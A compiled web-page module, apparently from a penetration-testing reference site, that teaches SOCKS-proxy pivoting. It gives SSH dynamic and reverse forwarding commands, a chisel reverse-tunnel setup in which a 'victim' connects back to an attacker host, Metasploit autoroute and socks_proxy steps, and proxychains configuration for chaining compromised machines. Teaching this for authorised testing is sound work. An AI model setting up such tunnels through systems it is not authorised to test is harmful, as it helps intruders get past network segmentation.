import{_ as o,c as p,a5 as r,G as a,w as n,B as h,o as k,j as s,a as i}from"./chunks/framework.B5CpDqM0.js";const c="/assets/Chained%20dynamic%20port%20forwarding%20diagram.CUr414HI.png",d="/assets/Chained%20dynamic%20port%20forwarding%20commands%20SSH.bUL3NTI4.png",g="/assets/Chained%20dynamic%20port%20forwarding%20commands%20proxychains.DE75n6mz.png",u="/assets/Chained%20dynamic%20port%20forwarding%20commands%20SOCKS.-QOBaSvz.png",x=JSON.parse('{"title":"üõ†Ô∏è SOCKS proxy","description":"","frontmatter":{"authors":"ShutdownRepo"},"headers":[],"relativePath":"infra/pivoting/socks-proxy.md","filePath":"infra/pivoting/socks-proxy.md","lastUpdated":1724982529000}'),y={name:"infra/pivoting/socks-proxy.md"};function m(F,e,C,b,f,S){const t=h("PluginTabsTab"),l=h("PluginTabs");return k(),p("div",null,[e[3]||(e[3]=r('<h1 id="üõ†Ô∏è-socks-proxy" tabindex="-1">üõ†Ô∏è SOCKS proxy <a class="header-anchor" href="#üõ†Ô∏è-socks-proxy" aria-label="Permalink to &quot;üõ†Ô∏è SOCKS proxy&quot;">‚Äã</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">‚Äã</a></h2><p>SOCKS (SOCKet Secure) is a network protocol that allows users to route network traffic to a server on a client&#39;s behalf. SOCKS is between the application and the transport layer of the OSI model.</p><p>This is especially useful for penetration testing engagements where a target is hiding behind one or multiple firewalls. A compromised server connected to two networks can be used as a SOCKS proxy server to pivot from a network to another.</p><p>In short, a SOCKS proxy can relay TCP and UDP connections and hence help bypass network segmentation. It&#39;s sort a dynamic <a href="./port-forwarding">port forwarding</a> technique.</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">‚Äã</a></h2><p>There are two types of dynamic port forwarding used during penetration testing engagements.</p><ul><li>Dynamic port forwarding: tunnel the whole attacker&#39;s network traffic (instead of only one port) through a remote machine.</li><li>Reverse dynamic port forwarding: tunnel the whole network traffic from a remote machine through the attacker&#39;s machine.</li></ul><h3 id="basic-server-setup" tabindex="-1">Basic server setup <a class="header-anchor" href="#basic-server-setup" aria-label="Permalink to &quot;Basic server setup&quot;">‚Äã</a></h3><div class="tip custom-block"><p>While setting up port forwarding, it&#39;s important to remember that non-admin users can only open ports above 1024.</p></div><p>In practice, there are many ways to turn a controlled machine into a SOCKS proxy server.</p>',11)),a(l,null,{default:n(()=>[a(t,{label:"SSH commands"},{default:n(()=>e[0]||(e[0]=[s("p",null,[i("One of the most easy is by relying on SSH, however, it requires to have an SSH server running on the controlled machine and a valid account. The tester needs to open an SSH connection to the machine that should be turned into a SOCKS proxy, and supply the "),s("code",null,"-D"),i(" option along with the port to use for tunneling. The command can also be used with "),s("code",null,"-N"),i(" option to make sure no command gets executed after the SSH session is opened.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ssh"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -N"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -D"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $PORT $CONTROLLED_TARGET")])])])],-1),s("p",null,[i("Once the ssh command exits successful (or once a session opens) the tester can then proceed to "),s("a",{href:"./socks-proxy#usage"},"the usage part"),i(".")],-1),s("p",null,[i("A reverse dynamic port forwarding can be also put in place to tunnel a machine's traffic through the attacker machine. It is implemented entirely in the client (i.e. the server does not need to be updated) ("),s("a",{href:"https://www.openssh.com/txt/release-7.6",target:"_blank",rel:"noreferrer"},"since OpenSSH 7.6"),i(").")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ssh"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -N"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -R"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $PORT $CONTROLLED_TARGET")])])])],-1)])),_:1}),a(t,{label:"Chisel"},{default:n(()=>e[1]||(e[1]=[s("p",null,[s("a",{href:"https://github.com/jpillora/chisel",target:"_blank",rel:"noreferrer"},"Chisel"),i(" is a standalone binary for pivoting on Linux and Windows systems.")],-1),s("p",null,"Working on a server/client, the binary simply needs to be uploaded on the victim host and executed as server on the attacker machine.",-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# attacker")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"chisel"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," server"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --reverse"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --socks5"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $PORT")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# victim")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"chisel"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," client"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $ATTACKER_MACHINE_IP"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},":"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$ATTACKER_MACHINE_PORT "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"R:socks")])])])],-1)])),_:1}),a(t,{label:"SSH config"}),a(t,{label:"Metasploit"},{default:n(()=>e[2]||(e[2]=[s("p",null,"A meterpreter session can be taken advantage of by setting up a SOCKS proxy with the appropriate module.",-1),s("p",null,"The first steps consists in creating a route, from a meterpreter shell to the target",-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"meterpreter"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," >"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," run"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," autoroute"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -s"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 10.11.1.0/24")])])])],-1),s("p",null,"The session can then be put in background and, the SOCKS server can be created.",-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"msf"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," >"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," use"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," auxiliary/server/socks_proxy")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"msf"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," >"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," SRVPORT"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $PORT")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"msf"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," >"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," VERSION"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 4a")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"msf"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," >"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," run")])])])],-1)])),_:1}),a(t,{label:"Cobalt Strike"}),a(t,{label:"proxychains"}),a(t,{label:"3proxy"}),a(t,{label:"plink"})]),_:1}),e[4]||(e[4]=r(`<h3 id="basic-client-usage" tabindex="-1">Basic client usage <a class="header-anchor" href="#basic-client-usage" aria-label="Permalink to &quot;Basic client usage&quot;">‚Äã</a></h3><p>Once the SOCKS proxy server is set up, network traffic can be tunneled through with <a href="https://github.com/rofl0r/proxychains-ng" target="_blank" rel="noreferrer">proxychains-ng</a> (C), a tool still maintained and more advanced based on the original <a href="https://github.com/haad/proxychains" target="_blank" rel="noreferrer">proxychains</a> (that is not maintained anymore). The port in use by the SOCKS proxy should be supplied in the configuration file (<code>/etc/proxychains.conf</code>) like in the following examples.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># type ip port [user pass]</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">socks5</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 192.168.67.78</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1080</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> lamer</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> secret</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">socks4</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 192.168.11.49</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1080</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">http</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 192.168.89.33</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 8080</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> justu</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> hidden</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">http</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 192.168.39.93</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 8080</span></span></code></pre></div><h3 id="chaining-proxies" tabindex="-1">Chaining proxies <a class="header-anchor" href="#chaining-proxies" aria-label="Permalink to &quot;Chaining proxies&quot;">‚Äã</a></h3><p>In certain scenarios, SOCKS proxies can be chained. This can easily be used with <a href="./socks-proxy#client-usage">proxychains</a>. In the following example, SSH is used to turn compromised machines into SOCKS proxy servers.</p><p><img src="`+c+'" alt=""></p><p class="caption"><img src="'+d+'" alt=""> Setting up the SOCKS proxy servers (with SSH)</p><p class="caption"><img src="'+g+'" alt=""> Setting up the SOCKS proxy client (proxychains)</p><p class="caption"><img src="'+u+'" alt=""> Attacking the target through the chain of SOCKS proxies</p>',9))])}const B=o(y,[["render",m]]);export{x as __pageData,B as default};
